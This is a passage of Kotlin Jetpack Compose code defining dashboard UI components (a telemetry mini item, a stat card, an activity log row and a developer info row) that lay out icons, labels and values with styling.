                    ActivityLogItem(
                        icon = item.icon,
                        title = item.title,
                        subtitle = item.subtitle,
                        time = item.time,
                        color = item.color
                    )
                    if (index < logs.size - 1) {
                        Divider(color = BorderColor)
                    }
                }
            }
        }
    }
    }
}

@Composable
fun TelemetryMiniItem(
    icon: ImageVector,
    label: String,
    value: String,
    color: Color
) {
    Column(
        horizontalAlignment = Alignment.CenterHorizontally,
        modifier = Modifier.width(90.dp)
    ) {
        Icon(
            imageVector = icon,
            contentDescription = label,
            tint = color,
            modifier = Modifier.size(24.dp)
        )
        Spacer(modifier = Modifier.height(4.dp))
        Text(
            text = label,
            color = LightText,
            fontSize = 11.sp,
            fontWeight = FontWeight.Medium
        )
        Text(
            text = value,
            color = DarkText,
            fontSize = 12.sp,
            fontWeight = FontWeight.Bold,
            maxLines = 1,
            overflow = TextOverflow.Ellipsis
        )
    }
}

@Composable
fun StatCard(
    title: String,
    count: String,
    subtitle: String,
    icon: ImageVector,
    color: Color,
    onClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    Card(
        modifier = modifier
            .clickable(onClick = onClick)
            .border(1.dp, BorderColor, RoundedCornerShape(12.dp)),
        colors = CardDefaults.cardColors(containerColor = WhiteSurface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(
            modifier = Modifier.padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = title,
                    color = LightText,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold
                )
                Icon(
                    imageVector = icon,
                    contentDescription = null,
                    tint = color.copy(alpha = 0.7f),
                    modifier = Modifier.size(20.dp)
                )
            }
            Text(
                text = count,
                color = DarkText,
                fontSize = 24.sp,
                fontWeight = FontWeight.ExtraBold
            )
            Text(
                text = subtitle,
                color = LightText,
                fontSize = 11.sp
            )
        }
    }
}

@Composable
fun ActivityLogItem(
    icon: ImageVector,
    title: String,
    subtitle: String,
    time: String,
    color: Color
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(12.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Box(
            modifier = Modifier
                .size(36.dp)
                .background(color.copy(alpha = 0.1f), CircleShape),
            contentAlignment = Alignment.Center
        ) {
            Icon(
                imageVector = icon,
                contentDescription = null,
                tint = color,
                modifier = Modifier.size(20.dp)
            )
        }
        Column(modifier = Modifier.weight(1f)) {
            Text(
                text = title,
                color = DarkText,
                fontSize = 14.sp,
                fontWeight = FontWeight.Bold
            )
            Text(
                text = subtitle,
                color = LightText,
                fontSize = 12.sp,
                maxLines = 1,
                overflow = TextOverflow.Ellipsis
            )
        }
        Text(
            text = time,
            color = LightText,
            fontSize = 11.sp
        )
    }
}

@Composable
fun DevInfoRow(label: String, value: String) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Text(
            text = label,
            fontSize = 11.sp,
            color = LightText,
            fontWeight = FontWeight.Medium,
            modifier = Modifier.weight(0.45f)
        )
        Text(
            text = value,
            fontSize = 11.sp,
            color = DarkText,
            fontWeight = FontWeight.Bold,
            maxLines = 2,
            overflow = TextOverflow.Ellipsis,
            modifier = Modifier.weight(0.55f),
            textAlign = androidx.compose.ui.text.style.TextAlign.End
        )
    }
}

